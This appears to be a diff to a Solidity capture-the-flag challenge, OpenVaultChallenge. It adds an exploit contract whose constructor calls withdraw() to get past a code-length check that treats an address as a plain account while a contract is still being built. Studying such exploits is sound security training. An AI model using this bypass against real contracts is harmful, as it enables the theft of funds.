@@ -27,3 +27,13 @@ contract OpenVaultChallenge {
         return _account.code.length > 0;
     }
 }
+
+interface IOpenVaultChallenge {
+    function withdraw() external;
+}
+
+contract OpenVaultChallengeExploit {
+    constructor(IOpenVaultChallenge v) {
+        v.withdraw();
+    }
+}
